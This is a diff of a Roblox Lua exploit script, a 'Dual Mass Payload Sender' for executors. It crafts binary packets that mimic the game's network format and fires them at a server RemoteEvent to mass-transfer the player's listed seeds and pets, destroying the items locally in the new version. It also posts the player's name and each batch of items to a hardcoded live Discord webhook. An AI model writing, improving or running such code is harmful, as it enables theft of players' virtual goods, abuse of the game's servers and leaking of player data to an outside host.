@@ -1,138 +1,147 @@
--- Generated Dual Mass Payload Sender
+-- Generated Dual Mass Payload Sender v2 (Fixed)
 local ALLOWED_PETS = {"Robin"}
 local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
-
 local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEvent
-
 local petLookup = {}
 for _, p in ipairs(ALLOWED_PETS) do petLookup[string.lower(p)] = true end
-
 local seedLookup = {}
 for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[string.lower(s)] = true end
 
 local function sendWebhook(msg)
-    local req = (type(request) == "function" and request) 
-        or (type(http_request) == "function" and http_request) 
-        or (syn and type(syn.request) == "function" and syn.request) 
-        or (http and type(http.request) == "function" and http.request)
-    if req then
-        pcall(req, {
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode({content = msg})
-        })
-    end
+	local req = (type(request) == "function" and request)
+		or (type(http_request) == "function" and http_request)
+		or (syn and type(syn.request) == "function" and syn.request)
+		or (http and type(http.request) == "function" and http.request)
+	if req then
+		pcall(req, {
+			Url = WEBHOOK,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = game:GetService("HttpService"):JSONEncode({content = msg})
+		})
+	end
 end
 
 local player = game:GetService("Players").LocalPlayer
 local backpack = player:WaitForChild("Backpack")
+sendWebhook("🚀 Dual Mass Sender Started by " .. player.Name)
 
-sendWebhook("🚀 **Dual Mass Script Started** by " .. player.Name)
-
--- Dynamic Serializer function matching Cobalt's binary specs
+-- Build single item block matching Cobalt format
 local function buildItemBlock(itemKey, count, category)
-    local typeStr = "\v"
-    
-    -- 1. Format ItemKey header + value
-    local itemKeyHeader = typeStr .. string.char(#"ItemKey") .. "ItemKey"
-    local itemKeyValue = typeStr .. string.char(#itemKey) .. itemKey
-    
-    -- 2. Format Count header + integer value
-    local countHeader = typeStr .. string.char(#"Count") .. "Count"
-    local countValue = "\x05" .. string.char(count)
-    
-    -- 3. Format Category header + value
-    local categoryHeader = typeStr .. string.char(#"Category") .. "Category"
-    local categoryValue = typeStr .. string.char(#category) .. category
-    
-    return "\x1C" .. itemKeyHeader .. itemKeyValue .. countHeader .. countValue .. categoryHeader .. categoryValue
+	local typeStr = "\v"
+	-- ItemKey field
+	local itemKeyHeader = typeStr .. string.char(#"ItemKey") .. "ItemKey"
+	local itemKeyValue = typeStr .. string.char(#itemKey) .. itemKey
+	-- Count field (integer type + value)
+	local countHeader = typeStr .. string.char(#"Count") .. "Count"
+	local countValue = "\x05" .. string.char(count)
+	-- Category field
+	local categoryHeader = typeStr .. string.char(#"Category") .. "Category"
+	local categoryValue = typeStr .. string.char(#category) .. category
+	
+	return "\x1C" .. itemKeyHeader .. itemKeyValue .. countHeader .. countValue .. categoryHeader .. categoryValue
 end
 
--- Tracks already processed unique item instances in this execution run to avoid duplicate spamming
-local sentItems = {}
+local processedItems = {}
 
--- Core Execution Queue loop
 while true do
-    local items = backpack:GetChildren()
-    local selectedQueue = {}
-
-    -- Scan backpack for targets
-    for _, item in ipairs(items) do
-        if #selectedQueue >= 20 then break end -- Max batch size is 20
-        
-        if not sentItems[item] then
-            local isSeed = item:GetAttribute("MainCategory") == "Seed"
-            if isSeed then
-                local seedName = item:GetAttribute("SeedTool")
-                local count = item:GetAttribute("Count") or 1
-                if seedName and seedLookup[string.lower(seedName)] then
-                    table.insert(selectedQueue, {
-                        ItemInstance = item,
-                        Key = seedName,
-                        Count = count,
-                        Category = "Seeds"
-                    })
-                end
-            else
-                local petName = item:GetAttribute("Pet")
-                local petId = item:GetAttribute("PetId")
-                if petName and petId and petLookup[string.lower(petName)] then
-                    table.insert(selectedQueue, {
-                        ItemInstance = item,
-                        Key = "$" .. petId,
-                        Count = 1,
-                        Category = "Pets"
-                    })
-                end
-            end
-        end
-    end
-
-    if #selectedQueue == 0 then
-        sendWebhook("🏁 **Inventory Cleared** – No remaining selected items in backpack.")
-        break
-    end
-
-    -- Construct the complete bundled Cobalt payload
-    local dynamicPayload = ""
-    for idx, itemData in ipairs(selectedQueue) do
-        local itemBlock = buildItemBlock(itemData.Key, itemData.Count, itemData.Category)
-        
-        -- Multi-item structural divider formatting
-        if idx == 1 then
-            dynamicPayload = itemBlock
-        else
-            -- \x00\x05 followed by item index separating subsequent items
-            dynamicPayload = dynamicPayload .. "\x00\x05" .. string.char(idx) .. itemBlock
-        end
-    end
-    -- Append trailing structure alignment tail
-    dynamicPayload = dynamicPayload .. "\x00\x00\x00"
-
-    -- Calculate total dynamic packet size for correct header declaration
-    local rawSize = #dynamicPayload + 12
-    local sizeByte = string.char(rawSize)
-    
-    -- Core payload signature structure matching Cobalt packets
-    local headerZone = "!\x01" .. sizeByte .. "\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
-    local finalPayload = headerZone .. dynamicPayload
-
-    -- Fire transaction all in one single packed frame
-    if Event then
-        Event:FireServer(buffer.fromstring(finalPayload))
-    end
-
-    -- Construct logs & mark items as sent
-    local logLines = {}
-    for _, itemData in ipairs(selectedQueue) do
-        table.insert(logLines, string.format("• %s (x%d) bundled.", itemData.ItemInstance.Name, itemData.Count))
-        sentItems[itemData.ItemInstance] = true
-    end
-    
-    sendWebhook("⚡ **Batch Fired (" .. #selectedQueue .. " items in 1 packet)**:\n" .. table.concat(logLines, "\n"))
-
-    -- Immediately sweep next batch if there are still items left, otherwise complete loop
-    task.wait(10)
+	local items = backpack:GetChildren()
+	local selectedQueue = {}
+	local seenKeys = {}
+	
+	-- Scan backpack with duplicate prevention
+	for _, item in ipairs(items) do
+		if #selectedQueue >= 20 then break end
+		
+		local itemName = item.Name
+		local itemKey = nil
+		local count = 1
+		local category = nil
+		local isSeed = false
+		
+		-- Check for Seeds
+		if item:GetAttribute("MainCategory") == "Seed" then
+			isSeed = true
+			local seedName = item:GetAttribute("SeedTool")
+			if seedName and seedLookup[string.lower(seedName)] then
+				itemKey = seedName
+				count = item:GetAttribute("Count") or 1
+				category = "Seeds"
+			end
+		else
+			-- Check for Pets
+			local petId = item:GetAttribute("PetId")
+			if petId then
+				local petName = item:GetAttribute("Pet") or item.Name
+				if petLookup[string.lower(petName)] then
+					itemKey = "$" .. petId
+					count = 1
+					category = "Pets"
+				end
+			end
+		end
+		
+		-- Add to queue if valid and not duplicate
+		if itemKey and category then
+			local uniqueKey = category .. ":" .. itemKey
+			if not seenKeys[uniqueKey] then
+				seenKeys[uniqueKey] = true
+				processedItems[uniqueKey] = (processedItems[uniqueKey] or 0) + (isSeed and count or 1)
+				table.insert(selectedQueue, {
+					ItemInstance = item,
+					Key = itemKey,
+					Count = count,
+					Category = category,
+					UniqueKey = uniqueKey
+				})
+			end
+		end
+	end
+	
+	if #selectedQueue == 0 then
+		sendWebhook("🏁 **Inventory Cleared** – All selected items processed.")
+		break
+	end
+	
+	-- Build complete payload with all items
+	local dynamicPayload = ""
+	for idx, itemData in ipairs(selectedQueue) do
+		local itemBlock = buildItemBlock(itemData.Key, itemData.Count, itemData.Category)
+		
+		if idx == 1 then
+			dynamicPayload = itemBlock
+		else
+			-- Multi-item separator
+			dynamicPayload = dynamicPayload .. "\x00\x05" .. string.char(idx) .. itemBlock
+		end
+	end
+	
+	-- Packet structure end
+	dynamicPayload = dynamicPayload .. "\x00\x00\x00"
+	
+	-- Calculate size byte
+	local rawSize = #dynamicPayload + 12
+	local sizeByte = string.char(math.min(rawSize, 255))
+	
+	-- Build header matching Cobalt format
+	local headerZone = "!\x01" .. sizeByte .. "\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
+	local finalPayload = headerZone .. dynamicPayload
+	
+	-- Fire event
+	if Event then
+		Event:FireServer(buffer.fromstring(finalPayload))
+	end
+	
+	-- Log and cleanup
+	local logLines = {}
+	for _, itemData in ipairs(selectedQueue) do
+		table.insert(logLines, string.format("• %s (x%d)", itemData.Key, itemData.Count))
+		itemData.ItemInstance:Destroy()
+	end
+	
+	sendWebhook("⚡ **Batch Fired (" .. #selectedQueue .. " items)**:\n" .. table.concat(logLines, "\n"))
+	
+	-- Wait before next batch
+	task.wait(10)
 end
